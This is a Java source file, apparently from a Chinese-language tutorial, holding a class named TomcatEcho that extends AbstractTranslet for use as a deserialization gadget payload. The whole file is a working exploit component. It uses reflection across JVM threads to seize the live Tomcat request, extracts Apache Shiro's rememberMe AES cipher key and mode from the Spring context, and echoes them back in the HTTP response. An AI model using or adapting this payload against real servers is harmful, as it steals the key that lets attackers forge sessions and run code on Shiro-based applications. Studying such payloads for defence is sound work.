package org.crazycake.shiroredisspringboottutorial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.web.mgt.CookieRememberMeManager;
import org.apache.shiro.web.mgt.DefaultWebSecurityManager;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.concurrent.ConcurrentHashMap;

public class TomcatEcho extends AbstractTranslet {

    public HttpServletRequest request = null;
    public HttpServletResponse response = null;

    public TomcatEcho() throws Exception {
        // 从线程中获取 request 对象
        Object request = getRequestFromThreads();
        // request 对象赋值给成员属性。
        load(request);
        // 从线程中获取 shiro 密钥
        String keys = "keys: " + getShiroKeysFromThreads();
        // 将 shiro 密钥回显给当前请求
        PrintWriter writer = response.getWriter();
        writer.write(keys);
    }

    // 线程中获取 request 对象，详见 4.3 节
    private static Object getRequestFromThreads() throws Exception {
        //标记是否回显成功，成功后不再继续
        boolean flag = false;
        //临时存储反射取到的field对象
        Object o = null;
        try {
            //获取当前所有线程
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
            //遍历所有线程
            for (int i = 0; i < threads.length; i++) {
                //当前线程
                Thread thread = threads[i];
                //获取线程名
                String threadName = thread.getName();
                try {
                    //当前线程名包含http，但是不包含exec时
                    if (!threadName.contains("exec") && threadName.contains("http")) {
                        //获取当前线程的名为target的field对象
                        o = getField(thread, "target");
                        //如果当前field对象不为Runnable类的实例，则遍历下一个线程
                        if (!(o instanceof Runnable)) {
                            continue;
                        }
                        try {
                            //获取同时满足包含这三个属性名的field对象
                            o = getField(getField(getField(o, "this$0"), "handler"), "global");
                        } catch (Exception e) {
                            //如果没有找到抛出异常，则遍历下一个线程
                            continue;
                        }
                        //获取名为processors的field对象，该对象为ArrayList类型
                        ArrayList processors = (ArrayList) getField(o, "processors");
                        for (int j = 0; j < processors.size(); j++) {
                            //获取当前processor的requestInfo对象
                            RequestInfo requestInfo = (RequestInfo) processors.get(j);
                            //获取当前requestInfo的coyote下面的req对象
                            Request req = (Request) getField(requestInfo, "req");
                            if (req.decodedURI().isNull()) {
                                continue;
                            }
                            //获取当前requestInfo的connector下面的req对象
                            org.apache.catalina.connector.Request tomReq = (org.apache.catalina.connector.Request) req.getNote(1);
                            return tomReq;

                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public void load(Object obj) throws NoSuchFieldException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        System.out.println("load");
        try {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
            }
        } catch (Exception var8) {
            // do nothing
        }
    }

    private static String getShiroKeysFromThreads() {
        try {
            Thread[] ts = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));
            for (int i = 0; i < ts.length; ++i) {
                Thread t = ts[i];
                // 从线程中获取 shiro 密钥，详见 4.4 节
                String res = getKeyByClassLoader(t);
                System.out.println(res);
                if (isNotBlank(res)) {
                    return res;
                }
            }
        } catch (Exception var17) {
            ;
        }
        return null;
    }

    public static String getKeyByClassLoader(Object thread) throws Exception {
        CookieRememberMeManager rememberMeManager = null;
        Object cipherService = null;
        try {
            Object contextClassLoader = getField(thread, "contextClassLoader");
            Object resources = null;
            resources = getField(contextClassLoader, "resources");
            Object context = getField(resources, "context");
            context = getField(context, "context");
            Object attributes = getField(context, "attributes");
            ConcurrentHashMap attribute = (ConcurrentHashMap) attributes;
            Object o = attribute.get("org.springframework.web.context.WebApplicationContext.ROOT");
            Object applicationEventMulticaster = getField(o, "applicationEventMulticaster");
            Object retrievalMutex = getField(applicationEventMulticaster, "retrievalMutex");
            ConcurrentHashMap retrievalMute = (ConcurrentHashMap) retrievalMutex;
            Object securityManager = retrievalMute.get("securityManager");
            DefaultWebSecurityManager securityManager1 = (DefaultWebSecurityManager) securityManager;
            rememberMeManager = (CookieRememberMeManager) securityManager1.getRememberMeManager();
            cipherService = getField(rememberMeManager, "cipherService");
        } catch (Exception e) {
            return "";
        }
        AesCipherService cipherService1 = (AesCipherService) cipherService;
        return "cipherKey : " + new String(Base64.getEncoder().encode(rememberMeManager.getCipherKey())) +
                "Mode : " + cipherService1.getModeName();
    }

    // 反射获取对象属性值，详见 4.3 节
    private static Object getField(Object o, String s) throws Exception {
        Field f = null;
        Class clazz = o.getClass();

        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }

        if (f == null) {
            throw new NoSuchFieldException(s);
        } else {
            f.setAccessible(true);
            return f.get(o);
        }
    }

    public static boolean isNotBlank(String s) {
        return !isBlank(s);
    }

    public static boolean isBlank(String s) {
        return s == null || s.trim().isEmpty();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
